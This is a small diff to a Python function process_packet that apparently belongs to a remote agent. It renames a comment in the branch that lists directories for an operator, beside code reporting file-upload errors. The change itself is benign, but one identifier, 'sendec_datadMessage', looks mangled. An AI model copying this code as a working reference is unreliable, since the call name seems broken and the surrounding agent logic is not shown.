@@ -350,7 +350,7 @@ def process_packet(packetType, data, resultID):
             sendec_datadMessage(build_response_packet(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)), resultID))
 
     elif packetType == 43:
-        # dir list
+        # directory list
         parts = data.split(" ")
         cmdargs = parts[0]
 
